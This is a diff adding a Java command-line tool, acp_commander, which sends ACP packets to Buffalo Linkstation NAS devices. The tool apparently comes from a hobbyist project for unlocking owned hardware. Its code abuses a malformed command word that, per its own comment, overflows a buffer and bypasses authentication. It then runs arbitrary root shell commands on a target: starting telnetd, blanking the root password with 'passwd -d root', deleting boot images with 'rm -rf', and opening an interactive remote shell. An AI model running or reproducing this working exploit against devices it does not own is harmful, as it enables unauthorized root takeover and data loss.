@@ -1,0 +1,563 @@
+package acpcommander;
+
+/**
+ * <p>Überschrift: acp_commander</p>
+ *
+ * <p>Beschreibung: Used to sent ACP-commands to Buffalo Linkstations (R).
+ *  Out of the work of linkstationwiki.net</p>
+ *
+ * <p>Copyright: Copyright (c) 2006</p>
+ *
+ * <p>Organisation: linkstationwiki.net</p>
+ *
+ * @author Georg
+ * @version 0.2
+ */
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.InetAddress;
+import java.net.DatagramSocket;
+import java.net.DatagramPacket;
+import java.util.Random;
+
+public class acp_commander {
+    private static String _version = "0.2";
+    private static int _debug = 0;
+    private static Integer _stdport = new Integer(22936);
+    private static String _state;
+
+
+//    public acp_commander() {
+//    }
+
+    private static String getParamValue (String name, String [] args){
+        // not looking at the last argument, as it would have no following parameter
+        for (int i=0; i<args.length-1; ++i) {
+            if (args[i].equals(name)) {
+                return args[i+1];
+            }
+        }
+        return null;
+    }
+
+    private static String getParamValue (String name, String [] args, String defvalue){
+        // not looking at the last argument, as it would have no following parameter
+        for (int i=0; i<args.length-1; ++i) {
+            if (args[i].equals(name)) {
+                return args[i+1];
+            }
+        }
+        return defvalue;
+    }
+
+    private static boolean hasParam(String name, String[] args) {
+        for (int i = 0; i < args.length; ++i) {
+            if (args[i].equals(name)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private static boolean hasParam (String [] names, String [] args) {
+        for (int i=0; i<args.length; ++i) {
+            for (int j= 0; j < names.length; ++j) {
+                if (args[i].equals(names [j])) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    private static void outTitle() {
+        System.out.println(
+                "ACP_commander out of the linkstationwiki.net project.\n" +
+                "Used to send ACP-commands to Buffalo linkstation(R) LS-PRO.\n\n" +
+                "WARNING: This is experimental software that might brick your linkstation!\n\n");
+    }
+
+    private static void usage() {
+        // How do I get the fileversion set in the project description?
+
+        outTitle();
+        System.out.println("Version " + _version + "\n");
+
+        System.out.println("Usage:  acp_commander [options] -t target\n\n" +
+                           "options are:\n" +
+                           "   -t target .. IP or network name of the Linkstation\n"+
+                           "   -o       ... open the linkstation by sending 'telnetd' and 'passwd -d root',\n" +
+                           "                thus enabling telnet and the root password\n" +
+                           "   -c cmd   ... sends the given shell command cmd to the linkstation.\n" +
+                           "   -m MAC   ... define targets mac address set in the ACP package *),\n" +
+                           "                default = FF:FF:FF:FF:FF:FF.\n" +
+                           "   -s       ... interactive shell\n"+
+                           "   -cb      ... clear \boot, get rid of ACP_STATE_ERROR\n"+
+                           "                output of df follows for control\n"+
+                           "   -na      ... no authorisation, skip the ACP_AUTH packet. You should\n" +
+                           "                only use this option together with -i.\n" +
+                           "   -i ID    ... define a connection identifier, if not given, a random one will\n" +
+                           "                be used. (With param MAC the senders MAC address will be used.)\n" +
+                           "                Successfull authenitfications are stored in conjunction with a \n" +
+                           "                given connection ID. So you may reuse a previously used one.\n" +
+                           "                Using a lot of different id's in a chain of commands might\n" +
+                           "                cause a lot of overhead at the linkstation.\n" +
+                           "   -p port  ... define alternative port, default = " +
+                           _stdport.toString() + ".\n" +
+                           "   -d1 | -d2 .. set debug level, generate additional output\n" +
+                           "   -q       ... quiet, surpress header, does not work with -h or -v\n" +
+                           "   -h | -v  ... this output\n" +
+                           "\n" +
+                           "*)  this is not the MAC address the packet is sent to, but the address within\n" +
+                           "    the ACP packet. The linkstation will only react to ACP packets if they\n" +
+                           "    carry the correct (its) MAC-address or FF:FF:FF:FF:FF:FF\n" +
+//                "\n"+
+//                "Authentification has been disabled as password encryption is unclear and it seems not to be necessary anyway!"+
+                           "\n" +
+                           "This program is the result of the work done at linkstationwiki.net, which is\n" +
+                           "not related with Buffalo(R) in any way.");
+
+    }
+
+    //
+    // Helpers
+    //
+
+    private static void outDebug(String message, int debuglevel) {
+        // negative debuglevels are considered as errors!
+        if (debuglevel < 0) {
+            outError(message);
+            return;
+        }
+
+        if (debuglevel <= _debug) {
+            System.out.println(message);
+        }
+    }
+
+    private static void outError(String message) {
+        System.err.println("ERROR: " + message);
+        System.exit( -1);
+    }
+
+    private static void outWarning(String message) {
+        System.out.println("WARNING: " + message);
+    }
+
+    private static byte[] HexToByte(String hexstr) {
+        String pureHex = hexstr.replaceAll(":", "");
+        byte[] bts = new byte[pureHex.length() / 2];
+        for (int i = 0; i < bts.length; i++) {
+            bts[i] = (byte) Integer.parseInt(pureHex.substring(2*i, 2*i+2), 16);
+        }
+        return (bts);
+    }
+
+
+    private static String bufferToHex (byte buffer[], int startOffset, int length) {
+        StringBuffer hexString = new StringBuffer(2 * length);
+        int endOffset = startOffset + length;
+
+        for (int i = startOffset; i < endOffset; i++) {
+            appendHexPair(buffer[i], hexString);
+        }
+        return hexString.toString();
+    }
+
+    private static void appendHexPair(byte b, StringBuffer hexString) {
+        char highNibble = kHexChars[(b & 0xF0) >> 4];
+        char lowNibble = kHexChars[b & 0x0F];
+
+        hexString.append(highNibble);
+        hexString.append(lowNibble);
+    }
+
+    private static final char kHexChars[]=
+            { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
+
+    //
+    // ACP-related stuff
+    //
+
+
+    // helper function. Creates an ACP header in the given buf. The ACP header consits of 32 bytes
+    private static void setACPHeader(byte[] buf, String ACPCmd, String ConnID,
+                                     String targetMAC, byte payloadsize) {
+        buf[0] = 0x20; // length of header, 32 bytes
+        buf[4] = 0x08; // minor packet version
+        buf[6] = 0x01; // major packet version
+        buf[8] = HexToByte(ACPCmd.substring(2, 4))[0]; // lowbyte
+        buf[9] = HexToByte(ACPCmd.substring(0, 2))[0]; // highbyte
+        buf[10] = payloadsize;
+
+        byte[] test = HexToByte(ConnID);
+        System.arraycopy(test, 0, buf, 16, 6);
+        System.arraycopy(HexToByte(targetMAC), 0, buf, 22, 6);
+    }
+
+    // creates an ACPEnOneCmd packet
+    private static byte[] getACPEnOneCmd(String ConnID, String targetMAC) {
+        byte[] buf = new byte[72];
+        setACPHeader(buf, "80a0", ConnID, targetMAC, (byte) 0x28);
+        buf[32] = 0x0d;
+
+        System.arraycopy(HexToByte("14:bd:36:a7:a7:81:86:f1"), 0, buf, 40, 8); // the encrypted password as hexstring
+        return (buf);
+    }
+
+    // creates an ACPAuth packet
+    // BUG: the command word should be "80a0" instead of "8a10". This "bug" seems to cause
+    // a buffer overflow in clientServer_util which disables the whole authentication
+    // process and gives us full access to the ACP commands.
+    private static byte[] getACPAuth(String ConnID, String targetMAC) {
+        byte[] buf = new byte[72];
+        setACPHeader(buf, "8a10", ConnID, targetMAC, (byte) 0x28); // here is the bug
+        buf[32] = 0x0c;
+        System.arraycopy(HexToByte("05:80:24:8d:ab:9c:97:e0"), 0, buf, 40, 8); // the encrypted password as hexstring
+        return (buf);
+    }
+
+    // creates an ACPCMD packet, used to send telnet commands to the LS
+    private static byte[] getACPCmd(String ConnID, String targetMAC, String cmd) {
+        if (cmd.length() > 210) {
+            outError("Command line too long (>210 chars).");
+        }
+
+        byte[] buf = new byte[cmd.length() + 44];
+        setACPHeader(buf, "8a10", ConnID, targetMAC, (byte) (cmd.length() + 12));
+        buf[32] = (byte) (cmd.length());
+        buf[36] = 0x03; // type
+
+        System.arraycopy(cmd.getBytes(), 0, buf, 40, cmd.length());
+
+        return (buf);
+    }
+
+    // Analyses incoming ACP Replys
+    private static void outACPrcv(byte[] buf) {
+        // ACPCmd - Reply = 0xCA10
+        if ((buf[8] == 0x10) & (buf[9] == (byte) 0xca)) {
+            if ((buf[0x2c] == (byte) 0xff) & (buf[0x2d] == (byte) 0xff) &
+                (buf[0x2e] == (byte) 0xff) & (buf[0x2f] == (byte) 0xff)) {
+                System.out.print("Failure: ");
+            }
+            String cmdAnswer = new String();
+            int i = 40;
+            while ((buf[i] != 0x00) & (i < buf.length)) {
+                cmdAnswer = cmdAnswer + (char) buf[i++];
+            }
+            System.out.println(cmdAnswer);
+        } else {
+            String Answer = Integer.toHexString(buf[9] * 256 + buf[8]);
+            Answer = Answer.substring(Answer.length() - 4, Answer.length());
+            System.out.println("Unknown ACP-Reply: 0x" + Answer);
+        }
+
+    }
+
+
+    public static void main(String[] args) {
+
+        String _mac = new String("");
+        String _cmd = new String("");
+        String _connID = new String("");
+        String _target = new String("");
+        Integer _port = _stdport;
+        boolean _openbox = false;
+        boolean _authent = true;
+        boolean _shell = false;
+        boolean _clearboot = false;
+        _debug = 0;
+
+        //
+        // Parsing the command line parameters.
+        //
+        _state = "CmdLnParse";
+
+        // catch various standard options for help. Only -h and -v are official, though
+        if ((args.length == 0) | (hasParam(new String[] {"-h", "--h", "-v", "--v"
+          , "-?", "--?", "/h", "/?", "-help", "--help", "-version", "--version"},
+                                           args))) {
+            usage();
+            return;
+        }
+        else {
+            if (!hasParam("-q", args)) {
+                outTitle ();
+            }
+        }
+        if (hasParam("-d1", args)) {
+            _debug = 1;
+        }
+        if (hasParam("-d2", args)) {
+            _debug = 2;
+        }
+
+        if (hasParam("-t", args)) {
+            outDebug("Target parameter -t found", 2);
+            _target = getParamValue("-t", args, "");
+        } else {
+            outError(
+                    "You didn't specify a target! Parameter '-t target' is missing");
+            return;
+        }
+
+        if (hasParam("-p", args)) {
+            outDebug("Port parameter -p given", 2);
+            _port = new Integer(getParamValue("-p", args, _port.toString()));
+        }
+
+        if (hasParam("-na", args)) {
+            outDebug("Using parameter -na (no authentication)", 2);
+            _authent = false;
+        }
+
+        if (hasParam("-m", args)) {
+            outDebug("MAC-Address parameter -m given", 2);
+            _mac = getParamValue("-m", args, _mac);
+        }
+
+        if (hasParam("-o", args)) {
+            outDebug("Using parameter -o (openbox)", 1);
+            _openbox = true;
+        }
+
+        if (hasParam("-c", args)) {
+            outDebug("Command-line parameter -c given", 2);
+            _cmd = getParamValue("-c", args, "");
+        }
+
+        if (hasParam("-cb", args)) {
+            outDebug("Command-line parameter -cb given", 2);
+            _clearboot = true;
+        }
+
+        if (hasParam("-i", args)) {
+            outDebug("ConnectionID parameter -i given", 2);
+            _connID = getParamValue("-i", args, _connID);
+        }
+
+        if (hasParam("-s", args)) {
+            _shell = true;
+        }
+
+        //
+        // Catch some errors.
+        //
+        _state = "ErrCatch";
+
+        if ((_target.equals("")) | (_target == null)) {
+            outError("No target specified or target is null!");
+        }
+
+        if (hasParam("-c", args) & ((_cmd == null) | (_cmd.equals("")))) {
+            outError("Command-line argument -c given, but command line is empty!");
+        }
+
+        // add option -na for greater effect! ;)
+        if ((!_openbox) & (_cmd.equals("")) & (!_shell) & (!_clearboot)) {
+            outWarning("Nothing to do! None of the options -o, -c, -s or -cb are given.");
+            // might send an authentification packet, though.
+        }
+
+        if ((!_authent) & (_connID == "")) {
+            outWarning("Using a random connection ID without authentification!");
+        }
+
+        if (_connID.equals("")) {
+            // TODO
+            // generate random connection ID
+            Random generator = new Random();
+            byte[] temp_connID = new byte[6];
+            generator.nextBytes(temp_connID);
+            _connID = bufferToHex(temp_connID, 0, 6);
+            System.out.println("Using random connID value = " + _connID);
+        } else {
+            if (_connID.equalsIgnoreCase("mac")) {
+                // TODO
+                // get local MAC and set it as connection ID
+                _connID = "00:50:56:c0:00:08";
+                outWarning("Using local MAC not implemented, yet!\n"+
+                           "Using default connID value (" +_connID + ")");
+            } else {
+                // TODO
+                // check given connection id for length and content
+                _connID.replaceAll(":", "");
+                if (_connID.length() != 12) {
+                    outError(
+                            "Given connection ID has invalid length (not 6 bytes long)");
+                }
+            }
+
+        }
+
+        if (_mac.equals("")) {
+            // set default MAC
+            _mac = "FF:FF:FF:FF:FF:FF";
+        } else {
+            if (_mac.equalsIgnoreCase("mac")) {
+                // TODO
+                // get targets MAC and set it
+                _mac = "FF:FF:FF:FF:FF:FF";
+                outWarning("Using targets MAC is not implemented, yet!\n"+
+                           "Using default value (" + _mac + ")");
+            } else {
+                // TODO
+                // check given MAC for length and content
+                _mac = _mac.replaceAll(":", "");
+                if (_mac.length() != 12) {
+                    outError ("Given MAC has invalid length (not 6 bytes long)");
+                }
+                else {
+                    System.out.println ("Using MAC: " +_mac);
+                }
+            }
+        }
+
+        if (!_cmd.equals("")) {
+            // check for leading and trailing "
+            if (_cmd.startsWith("\"")) {
+                _cmd = _cmd.substring(1, _cmd.length());
+
+                // only check cmd-line end for " if it starts with one
+                if (_cmd.endsWith("\"")) {
+                    _cmd = _cmd.substring(0, _cmd.length() - 1);
+                }
+            }
+            outDebug ("Using cmd-line:\n>>"+ _cmd + "\n", 1);
+        }
+
+
+        try {
+
+            //
+            // variable definition
+            //
+            _state = "VarPrep";
+
+            InetAddress _targetIP = InetAddress.getByName(_target);
+        byte [] buf;
+        DatagramSocket _socket = new DatagramSocket();
+        DatagramPacket _packet = new DatagramPacket(new byte[0], 0, _targetIP,
+                _port.intValue());
+        DatagramPacket _receive = new DatagramPacket (new byte[500], 500);
+        _socket.setSoTimeout(5000); // set socket timeout to 5000 ms, some user report timeout problems
+
+            //
+            // Generate some output.
+            //
+
+        System.out.println("Using target:\t" + _targetIP.getHostName() + "/"+_targetIP.getHostAddress());
+            if (_port != _stdport) {
+                // if
+                System.out.println("Using port:\t" + _port.toString() +
+                                   "\t (this is NOT the standard port)");
+            } else {
+                outDebug("Using port:\t" + _port.toString(), 1);
+            }
+            outDebug("Using MAC-Address:\t" + _mac, 1);
+
+            //
+            // lets go
+            //
+
+
+            if (_authent) {
+                _state = "ACP_AUTHENT";
+/*
+                buf = getACPEnOneCmd (_connID, _mac);
+                _packet.setData (buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv (_receive.getData());
+*/
+
+                buf = getACPAuth(_connID, _mac);
+                _packet.setData(buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv(_receive.getData());
+
+            }
+
+            if (_openbox) {
+                _state = "ACP_OPENBOX";
+
+                buf = getACPCmd(_connID, _mac, "telnetd");
+                _packet.setData(buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv(_receive.getData());
+
+                buf = getACPCmd(_connID, _mac, "passwd -d root");
+                _packet.setData(buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv(_receive.getData());
+            }
+
+            if ( _clearboot ) {
+                _state = "clearboot";
+                buf = getACPCmd(_connID, _mac,
+                "cd /boot; rm -rf hddrootfs.buffalo.updated hddrootfs.img hddrootfs.buffalo.org hddrootfs.buffalo.updated.done");
+                _packet.setData(buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv(_receive.getData());
+
+                buf = getACPCmd(_connID, _mac, "df");
+                _packet.setData(buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv(_receive.getData());
+            }
+
+            if (!_cmd.equals("")) {
+                _state = "ACP_CMD";
+
+                buf = getACPCmd(_connID, _mac, _cmd);
+                _packet.setData(buf, 0, buf.length);
+                _socket.send(_packet);
+                _socket.receive(_receive);
+                outACPrcv(_receive.getData());
+            }
+
+            // create a telnet shell, leave with "exit"
+            if (_shell) {
+                _state="shell";
+                String cmdln = new String ("");
+                BufferedReader keyboard = new BufferedReader( new InputStreamReader(System.in) );
+                System.out.print("Enter telnet commands to LS, enter 'exit' to leave\n");
+
+                // get first commandline
+                System.out.print("/root>");
+                cmdln = keyboard.readLine();
+                System.out.print("\n");
+                while (( cmdln != null) && ( !cmdln.equals("exit") )) {
+                   // send command and display answer
+                    buf = getACPCmd(_connID, _mac, cmdln);
+                    _packet.setData(buf, 0, buf.length);
+                    _socket.send(_packet);
+                    _socket.receive(_receive);
+                    outACPrcv(_receive.getData());
+                    // get next commandline
+                    System.out.print(">");
+                    cmdln = keyboard.readLine();
+                    System.out.print("\n");
+                }
+
+            }
+
+        } catch (java.net.UnknownHostException HostE) {
+            //TODO error handling
+            outError("Exception: UnknownHost (" + HostE.getMessage()+") [Section: "+_state+"]");
+        } catch (java.net.SocketException SocketE) {
+            //TODO error handling
+            outError("Exception: Socket (" + SocketE.getMessage()+") [Section: "+_state+"]");
+        } catch (java.io.IOException IOE) {
+            //TODO error handling
+            outError("Exception: IO (" + IOE.getMessage()+") [Section: "+_state+"]");
+        }
+    }
+}
